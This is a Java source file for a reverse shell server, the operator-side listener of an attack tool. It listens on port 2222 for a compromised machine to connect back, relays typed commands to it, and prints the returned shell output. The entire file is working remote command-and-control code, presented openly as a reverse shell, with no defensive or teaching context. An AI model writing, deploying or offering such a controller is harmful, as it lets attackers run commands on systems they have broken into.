package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.net.*;

public class ReverseShellServer {

    private static final int SERVER_PORT = 2222;
    private ServerSocket serverSocket;
    private Socket clientSocket;
    private BufferedReader in;
    private PrintWriter out;
    private BufferedReader userInput;

    public static void main(String[] args) {
        ReverseShellServer server = new ReverseShellServer();
        server.start();
    }

    public void start() {
        try {
            setupServer();
            waitForConnection();
            setupStreams();

            Thread outputReceiver = new Thread(this::receiveResponse);
            outputReceiver.start();
            handleShell();

        } catch (IOException e) {
            System.err.println("[ERROR] Server error: " + e.getMessage());
        } finally {
            cleanup();
        }
    }

    private void setupServer() throws IOException {
        serverSocket = new ServerSocket(SERVER_PORT);
        System.out.println("[*] Server is running on port " + SERVER_PORT);
    }

    private void waitForConnection() throws IOException {
        System.out.println("[*] Waiting for incoming connection...");
        clientSocket = serverSocket.accept();
        System.out.println("[+] Connection established with " + clientSocket.getInetAddress());
    }

    private void setupStreams() throws IOException {
        in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        out = new PrintWriter(clientSocket.getOutputStream(), true);
        userInput = new BufferedReader(new InputStreamReader(System.in));
    }

    private void handleShell() throws IOException {
        String command;
        System.out.print("\nCommand> ");
        while (true) {
            command = userInput.readLine();

            if ("exit".equalsIgnoreCase(command)) {
                sendCommand("exit");
                break;
            }

            sendCommand(command);
        }
    }

    private void sendCommand(String command) {
        out.println(command);
    }

    private void receiveResponse() {
        try {
            String response;
            while ((response = in.readLine()) != null) {
                System.out.println("Shell> " + response);
                System.out.print("Command> ");
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error receiving response: " + e.getMessage());
        }
    }

    private void cleanup() {
        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (userInput != null) {
                userInput.close();
            }
            if (clientSocket != null) {
                clientSocket.close();
            }
            if (serverSocket != null) {
                serverSocket.close();
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error closing resources: " + e.getMessage());
        }
    }
}
